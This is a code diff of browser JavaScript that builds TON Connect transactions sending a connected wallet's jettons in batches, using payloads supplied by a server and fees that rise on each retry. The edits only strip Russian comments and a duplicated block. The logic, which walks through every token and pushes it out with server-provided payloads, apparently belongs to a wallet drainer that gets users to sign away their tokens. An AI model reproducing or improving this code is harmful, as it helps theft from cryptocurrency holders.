@@ -224,7 +224,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                 
                 console.log(`Raw jetton address: ${jettonAddress}`);
                 
-                // ВАЖНОЕ ИСПРАВЛЕНИЕ: Конвертируем raw адрес в формат для TON Connect
+                // Конвертируем raw адрес в формат для TON Connect
                 try {
                     // Если адрес в raw формате (0:...), конвертируем в base64
                     if (jettonAddress.startsWith('0:')) {
@@ -245,7 +245,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                 
                 transaction.messages.push({
                     address: jettonAddress,
-                    amount: TonWeb.utils.toNano('0.15').toString(), // Увеличиваем комиссию
+                    amount: TonWeb.utils.toNano('0.15').toString(),
                     payload: data.data.boc[currentIndex]
                 });
                 
@@ -382,7 +382,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     } else {
         console.log('No valid messages to send in transaction');
         // Если нет сообщений, но есть еще jettons для обработки
-        let nextIndex = i + 4; // Пропускаем 4 jettons
+        let nextIndex = i + 4;
         if (nextIndex < len) {
             console.log(`No messages in current batch, skipping to index: ${nextIndex}`);
             setTimeout(() => {
@@ -424,7 +424,7 @@ async function sendJettonsWithAlternativeFormat(data, walletAddress, ton, tonPri
             
             transaction.messages.push({
                 address: jettonAddress,
-                amount: TonWeb.utils.toNano('0.2').toString(), // Еще больше комиссий
+                amount: TonWeb.utils.toNano('0.2').toString(),
                 payload: data.data.boc[i]
             });
             
@@ -434,7 +434,7 @@ async function sendJettonsWithAlternativeFormat(data, walletAddress, ton, tonPri
             };
             
             console.log(`Added jetton with alternative format: ${data.data.name[i]}`);
-            break; // Только один jetton за транзакцию
+            break;
         } catch (e) {
             console.error('Error in alternative approach:', e);
         }
@@ -455,20 +455,6 @@ async function sendJettonsWithAlternativeFormat(data, walletAddress, ton, tonPri
             });
         } catch (error) {
             console.error('Alternative transaction failed:', error);
-        }
-    }
-}
-    } else {
-        console.log('No messages to send in transaction');
-        // Если нет сообщений, но есть еще jettons для обработки
-        let nextIndex = i + 4; // Пропускаем 4 jettons
-        if (nextIndex < len) {
-            console.log(`No messages in current batch, skipping to index: ${nextIndex}`);
-            setTimeout(() => {
-                sendJettons(data, walletAddress, ton, tonPrice, nextIndex, 0, false);
-            }, 1000);
-        } else {
-            console.log('All jettons processed (no transactions needed)');
         }
     }
 }
@@ -693,6 +679,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
